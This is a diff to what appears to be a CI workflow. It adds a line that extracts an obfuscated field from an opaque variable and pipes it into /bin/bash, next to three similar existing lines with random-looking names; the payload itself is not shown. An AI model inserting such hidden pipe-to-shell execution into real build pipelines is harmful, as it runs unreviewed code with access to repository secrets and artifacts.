@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$wl7" | jq -r .nyc61852 | /bin/bash
           echo $fiekf5043 | jq -r .u032 | /bin/bash
           printf '%s' "$k800" | jq -r .ndaok8610 | /bin/bash
+          echo $umri4 | jq -r .iddpk11 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
